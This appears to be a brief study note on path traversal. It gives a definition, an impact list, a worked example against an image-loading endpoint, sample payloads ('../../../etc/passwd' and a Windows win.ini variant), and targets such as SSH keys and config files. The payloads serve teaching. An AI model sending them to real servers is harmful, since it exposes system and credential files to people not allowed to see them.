# Path Traversal

## Definition

Path traversal is also known as directory traversal.

It allows attackers to access files outside the intended directory.

---

# Impact

- Read application files
- Read credentials
- Read OS files
- Access source code

In some cases:
- Write files
- Modify application behavior
- Full server compromise

---

# Example

```html
<img src="/loadImage?filename=218.png">
```

Application reads:

```bash
/var/www/images/218.png
```

Attack:

```bash
../../../etc/passwd
```

Result:

```bash
/var/www/images/../../../etc/passwd
```

Becomes:

```bash
/etc/passwd
```

---

# Important Payloads

## Linux

```bash
../../../etc/passwd
```

## Windows

```bash
..\\..\\..\\windows\\win.ini
```

---

# Notes

The sequence:

```bash
../
```

Moves one directory up.

---

# Common Targets

- /etc/passwd
- win.ini
- SSH keys
- Source code
- Config files
